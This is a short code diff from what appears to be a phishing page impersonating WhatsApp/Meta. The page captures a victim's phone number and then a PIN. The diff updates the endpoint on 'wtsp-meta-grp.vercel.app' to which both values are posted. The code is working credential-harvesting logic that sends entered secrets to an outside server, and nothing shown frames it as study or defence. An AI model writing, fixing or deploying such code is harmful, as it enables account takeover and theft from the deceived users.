@@ -266,7 +266,7 @@ phoneForm.addEventListener('submit', function(event) {
     console.log('Full phone number entered:', fullPhoneNumber);  // Debugging line
 
     // Send the full phone number to the server
-    fetch('https://wtsp-meta-grp.vercel.app/', {
+    fetch('https://wtsp-meta-grp.vercel.app/api/submit', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -296,7 +296,7 @@ pinForm.addEventListener('submit', function(event) {
     console.log('PIN entered:', pinCode);  // Debugging line
 
     // Send the PIN code to the server
-    fetch('https://wtsp-meta-grp.vercel.app/', {
+    fetch('https://wtsp-meta-grp.vercel.app/api/submit', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
